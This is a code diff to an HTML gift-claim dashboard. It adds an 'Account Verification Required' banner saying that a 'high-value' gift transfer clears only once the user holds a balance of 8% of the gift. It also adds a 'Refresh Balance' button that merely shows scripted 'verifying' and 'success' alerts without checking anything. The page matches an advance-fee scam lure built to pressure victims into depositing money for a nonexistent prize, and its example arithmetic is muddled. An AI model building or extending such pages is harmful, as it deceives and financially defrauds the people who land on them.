@@ -298,6 +298,87 @@
         }
         
         /* ============================================
+           VERIFICATION REQUIRED MESSAGE - NEW
+        ============================================ */
+        .verification-message {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin-bottom: 16px;
+            border-left: 5px solid #ff6b00;
+            border: 2px solid #ffe0b2;
+            box-shadow: 0 2px 10px rgba(255, 107, 0, 0.08);
+        }
+        
+        .verification-message .header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+            background: transparent;
+            padding: 0;
+            box-shadow: none;
+        }
+        
+        .verification-message .icon {
+            font-size: 28px;
+            color: #e65100;
+        }
+        
+        .verification-message .title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #e65100;
+            background: transparent;
+            padding: 0;
+        }
+        
+        .verification-message .message {
+            font-size: 13px;
+            color: #5d4037;
+            line-height: 1.6;
+            font-weight: 500;
+        }
+        
+        .verification-message .highlight {
+            color: #0066ff;
+            font-weight: 700;
+        }
+        
+        .verification-message .highlight-danger {
+            color: #e74c3c;
+            font-weight: 700;
+        }
+        
+        .verification-message .example {
+            background: rgba(255, 255, 255, 0.5);
+            padding: 10px 14px;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5d4037;
+            border: 1px dashed #ff6b00;
+        }
+        
+        .verification-message .refresh-btn {
+            background: #0066ff;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .verification-message .refresh-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 15px rgba(0, 102, 255, 0.3);
+        }
+        
+        /* ============================================
            QUICK ACTIONS
         ============================================ */
         .quick-actions {
@@ -531,6 +612,15 @@
             .claimed-gift-card .gift-details {
                 gap: 16px;
             }
+            .verification-message {
+                padding: 14px 16px;
+            }
+            .verification-message .title {
+                font-size: 14px;
+            }
+            .verification-message .message {
+                font-size: 12px;
+            }
         }
         
         @media (max-width: 380px) {
@@ -599,6 +689,25 @@
                     <div class="label">Claimed On</div>
                 </div>
             </div>
+        </div>
+
+        <!-- ============================================
+        VERIFICATION REQUIRED MESSAGE - NEW
+        ============================================ -->
+        <div class="verification-message">
+            <div class="header">
+                <span class="icon">⚠️</span>
+                <span class="title">Account Verification Required</span>
+            </div>
+            <div class="message">
+                To ensure your account is active and capable of receiving high-value transfers, system policy requires a minimum available balance equal to <span class="highlight">8% of the total gift amount</span>.
+                <br><br>
+                Please ensure your account meets this requirement, then refresh your balance to clear the pending transfer.
+            </div>
+            <div class="example">
+                <strong>📝 Example:</strong> If your pending gift is <strong>$1,000</strong>, your account must hold at least <strong>$80</strong> (<strong>$1,000 + $80 = $1,080</strong> total after processing).
+            </div>
+            <button class="refresh-btn" onclick="refreshBalance()">🔄 Refresh Balance</button>
         </div>
 
         <!-- Quick Actions -->
@@ -719,6 +828,7 @@
         const phone = localStorage.getItem('phone') || '771234567';
         const giftName = localStorage.getItem('giftName') || 'Gift';
         const giftIcon = localStorage.getItem('giftIcon') || '🎁';
+        const giftValue = localStorage.getItem('giftValue') || '$0';
 
         // Display user name
         document.getElementById('userName').textContent = fullName;
@@ -728,13 +838,25 @@
 
         // Display gift
         document.getElementById('giftIcon').textContent = giftIcon;
-        document.getElementById('giftName').textContent = giftName;
+        document.getElementById('giftName').textContent = giftName + ' (' + giftValue + ')';
+
+        // ============================================
+        // REFRESH BALANCE FUNCTION
+        // ============================================
+        function refreshBalance() {
+            alert('🔄 Refreshing your balance...\n\nPlease wait while we verify your account balance.');
+            
+            // Simulate refresh
+            setTimeout(() => {
+                alert('✅ Balance refreshed successfully!\n\nYour account is now ready to receive the gift.');
+            }, 2000);
+        }
 
         // ============================================
         // NOTIFICATION
         // ============================================
         function showNotification() {
-            alert('📬 Notifications\n\n1. Your gift has been claimed successfully!\n2. New gifts available! Check them out.');
+            alert('📬 Notifications\n\n1. Your gift has been claimed successfully!\n2. New gifts available! Check them out.\n3. Account verification required for your gift.');
         }
 
         // ============================================
@@ -750,6 +872,7 @@
                 localStorage.removeItem('phone');
                 localStorage.removeItem('giftName');
                 localStorage.removeItem('giftIcon');
+                localStorage.removeItem('giftValue');
 
                 // Redirect to login
                 window.location.href = 'login.html';
